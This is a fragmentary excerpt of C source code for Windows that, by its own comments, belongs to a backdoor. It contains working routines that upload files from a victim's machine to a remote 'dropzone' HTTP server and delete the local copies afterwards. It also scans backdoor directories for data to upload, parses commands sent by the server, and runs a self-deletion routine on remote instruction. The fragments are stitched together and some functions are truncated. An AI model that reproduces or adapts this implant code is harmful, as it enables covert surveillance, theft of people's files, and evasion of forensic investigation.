    hSession = WinHttpOpen(L"DR+", WINHTTP_ACCESS_TYPE_NAMED_PROXY, mwProxyConnection, WINHTTP_NO_PROXY_BYPASS, 0);
  } else 
    hSession = WinHttpOpen(L"DR-", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);



  ///
  /// Specify the dropzone HTTP server.
  ///

  mbstowcs(mwUploadServer, gUploadServer, MAX_BUF_SIZE);
  if (hSession)
    hConnect = WinHttpConnect(hSession, mwUploadServer, INTERNET_DEFAULT_HTTP_PORT, 0);
  else {
    mRetVal = 2;
    goto END_HTTP_UPLOAD;
  }



  ///
  /// Create the HTTP request handle.
  ///

  mbstowcs(mwUploadScript, HTTP_INPUT_SCRIPT, MAX_BUF_SIZE);
  if (hConnect)
    hRequest = WinHttpOpenRequest(hConnect, L"POST", mwUploadScript, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
  else {
    mRetVal = 3;
    goto END_HTTP_UPLOAD;
  }


	 
  ///
  /// Add the HTTP content type.
  ///

  if (hRequest)
    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/x-www-form-urlencoded", 47, WINHTTP_ADDREQ_FLAG_ADD);
  else {
    mRetVal = 4;
    goto END_HTTP_UPLOAD;
  }


  if ((mFH = fopen(pFileName, "r")) != NULL)
  {
    stat(pFileName, &mSB);



    ///
    /// Determine base file name.
    ///

    ZeroMemory(mBuffer, sizeof(mBuffer));
    if (strchr(pFileName, '/') != NULL)
    {
      mBaseNameB64EncodedFile = strrchr(pFileName, '/');
      mBaseNameB64EncodedFile++;
    } else if (strchr(pFileName, '\\') != NULL) {
      mBaseNameB64EncodedFile = strrchr(pFileName, '\\');
      mBaseNameB64EncodedFile++;
    } else {
      mBaseNameB64EncodedFile = pFileName;
    }

    snprintf(mBuffer, MAX_BUF_SIZE, "%s%s&cl=%d&%s%s&%s", PHP_LIID_VAR_NAME, gLIID, mSB.st_size, PHP_FILENAME_VAR_NAME, mBaseNameB64EncodedFile, PHP_DATA_VAR_NAME);



    ///
    /// Send the HTTP request.
    ///

    if (hRequest) 
      bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, mSB.st_size + strlen(mBuffer), 0);
    else {
      mRetVal = 5;
      goto END_HTTP_UPLOAD;
    }



    ///
    /// Write first data chunk.
    ///

    bResults = WinHttpWriteData(hRequest, mBuffer, strlen(mBuffer), &dwBytesWritten);
    ZeroMemory(mBuffer, sizeof(mBuffer));

    while (fgets (mBuffer, MAX_BUF_SIZE, mFH) != NULL)
    {
      mSizeCounter+= strlen(mBuffer);
      // send data to the server.
      bResults = WinHttpWriteData(hRequest, mBuffer, strlen(mBuffer), &dwBytesWritten);
      ZeroMemory(mBuffer, sizeof(mBuffer));
    }

    fclose(mFH);
    mFH = NULL;
//    bResults = WinHttpWriteData(hRequest, " ", 1, &dwBytesWritten);

  } else {
    mRetVal = 6;
    goto END_HTTP_UPLOAD;
  }



  ///
  /// Receive the dropzone response.
  ///

  if (bResults)
    bResults = WinHttpReceiveResponse(hRequest, NULL);
  else {
    mRetVal = 7;
    goto END_HTTP_UPLOAD;
  }



  // report any errors.
  if (!bResults)
  {
    mRetVal = 8;
    goto END_HTTP_UPLOAD;
  } else {



    ///
    /// Read HTTP response data
    ///

    do 
    {



      ///
      /// Check for available data.
      ///

      dwSize = 0;
      if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
        goto END_HTTP_UPLOAD;

      mTotalBytes += dwSize;
	


      ///
      /// Allocate space for the buffer.
      ///

      if ((pszOutBuffer = (char *) HeapAlloc(GetProcessHeap(), 0 , dwSize + 1)) == NULL)
      {
        dwSize = 0;
        pszOutBuffer = NULL;
        goto END_HTTP_UPLOAD;
       } else {



        ///
        /// Read the data.
        ///

        ZeroMemory(pszOutBuffer, dwSize + 1);
        if (!WinHttpReadData(hRequest, (LPVOID) pszOutBuffer, dwSize, &dwDownloaded))
          goto END_HTTP_UPLOAD;

        ///
        /// If transmission was successful, delete only the b64-file
        /// the rest will be deleted by the calling function
        ///

        if (strstr(pszOutBuffer, HTTP_TRANSMISSION_OK) != NULL)
        {
          DeleteFile(pFileName);  // remove the b64 data file
          mRetVal = 0;
        }

        if (pszOutBuffer != NULL)
        {
          HeapFree(GetProcessHeap(), 0, pszOutBuffer);
          pszOutBuffer = NULL;
        }  // if (pszOutBuffer != NULL)
      } // if (HeapAlloc() ...)
    } while (dwSize > 0);
  } // if (!bResults)


END_HTTP_UPLOAD:



  ///
  /// Release allocated resources.
  ///

  if (hRequest) WinHttpCloseHandle(hRequest);
  if (hConnect) WinHttpCloseHandle(hConnect);
  if (hSession) WinHttpCloseHandle(hSession);
  if (mFH) fclose(mFH);

  if (pszOutBuffer != NULL)
  {
    HeapFree(GetProcessHeap(), 0, pszOutBuffer);
    pszOutBuffer = NULL;
  }

  return(mRetVal);
}




/// 
/// ix) CLEANUP
///



  ///
  /// Check all possible backdoor directories for uploadable files.
  ///

  for(mCounter = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)
  {
    ZeroMemory(mTemp, sizeof(mTemp));
    ZeroMemory(mUploadDirFullPath, sizeof(mUploadDirFullPath));

    if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
    {
      
      
      
      ///
      /// Make sure the directory name ends with a backslash.
      ///

      if (mTemp[strlen(mTemp) - 1] != '\\')
        strcat(mTemp, "\\");
    
      if (gBaseDirectory[strlen(gBaseDirectory) - 1] != '\\')
        strcat(gBaseDirectory, "\\");



      ///
      ///Check if the CALLID file exists.
      ///

      snprintf(mUploadDirFullPath, sizeof(mUploadDirFullPath) - 1, "%s%s%s", mTemp, gBaseDirectory, CALLID_FILENAME);
      if (PathFileExists(mUploadDirFullPath))
        mRetVal++;   


      ///
      ///Check if the UPLOAD directory exists.
      ///

      ZeroMemory(mUploadDirFullPath, sizeof(mUploadDirFullPath));
      snprintf(mUploadDirFullPath, sizeof(mUploadDirFullPath) - 1, "%s%s%s", mTemp, gBaseDirectory, BD_DATA_DIR);

      if (mUploadDirFullPath[strlen(mUploadDirFullPath) - 1] != '\\')
        strcat(mUploadDirFullPath, "\\");

      if (PathFileExists(mUploadDirFullPath))
        mRetVal++;  


      if (mRetVal > 0)
        break;
    } // if (GetEnvironmentVariable(gBDEnvironmentDirs[mCounter], mTemp, sizeof(mTemp) - 1) > 0)
  }  // for(mCounter = 0; gBDEnvironmentDirs[mCounter] != NULL; mCounter++)

  return(mRetVal);
}    




///
///Do the local status checks.
///

int localStatusChecks()
{
  int mStatusMessages = 0; 
  int mCounter = 0;



  ///
  /// Is the backdoor installed (of course!)?
  ///

  mStatusMessages += gLocalStatusInformationValues[BT_INSTALLED];



///
/// We received status information/instructions from the dropzone.
/// Process the instructions.
///

void remoteStatusChecks(char *pStatusInformation)
{
  FILE *mFH = NULL;
  HANDLE mFileHandle = INVALID_HANDLE_VALUE;
  char *mTempPointer = 0;
  char mTemp[MAX_BUF_SIZE + 1];

  int mRemoteStatus = 0;
  int mRemoteStatusEntries = 0;
  int mCounter = 0;
  int mRemoteStatusArray[MAX_BUF_SIZE];


  mTempPointer = pStatusInformation;
  mCounter = 0;

  while (mTempPointer[mCounter] != NULL)
  {
    if (mTempPointer[mCounter] == '\n' || mTempPointer[mCounter] == '\r')
      mTempPointer[mCounter] = ' ';
    mCounter++;
  }
        


  ///
  ///Extract status data.
  ///

  ZeroMemory(mRemoteStatusArray, sizeof(mRemoteStatusArray));
  mRemoteStatus = 0;
  if (strstr(pStatusInformation, "status=") != NULL)
  {
    mTempPointer = strstr(pStatusInformation, "status") + strlen("status") + 1;

    if (strchr(mTempPointer, '&') != NULL)
    {
      ZeroMemory(mTemp, sizeof(mTemp));
      mCounter = 0;

      while (mTempPointer[mCounter] != '&' && mTempPointer[mCounter] != NULL)
        mCounter++;

      strncpy(mTemp, mTempPointer, mCounter);
      mRemoteStatus = atoi(mTemp);
    }
  }


  ///
  ///Fill in the "remote status array" values.
  ///

  while (gRemoteStatusInformationNames[mRemoteStatusEntries] != NULL) 
    mRemoteStatusEntries++;

  mCounter = 0;
  mRemoteStatusEntries -= 1;


  while (mRemoteStatusEntries >= 0)
  {
    if (mRemoteStatus >= gRemoteStatusInformationValues[mRemoteStatusEntries])
    {
      mRemoteStatusArray[mRemoteStatusEntries] = 1;
      mRemoteStatus -= gRemoteStatusInformationValues[mRemoteStatusEntries];
    } else
      mRemoteStatusArray[mRemoteStatusEntries] = 0;

    mRemoteStatusEntries--;
  } 


  mRemoteStatusEntries = 0;
  while (gRemoteStatusInformationNames[mRemoteStatusEntries] != NULL) 
    mRemoteStatusEntries++;

  mRemoteStatusEntries -= 1;




  ///
  /// viii) FINAL SUICIDE DEL.
  ///
  
  
  
  ///
  /// if we received a delete instruction, launch STRUCTURE deletion.
  ///

  if (mRemoteStatusArray[VR_DELETE_IT] == 1)
  {
    deleteEverything();
    exit(0);
  }
}

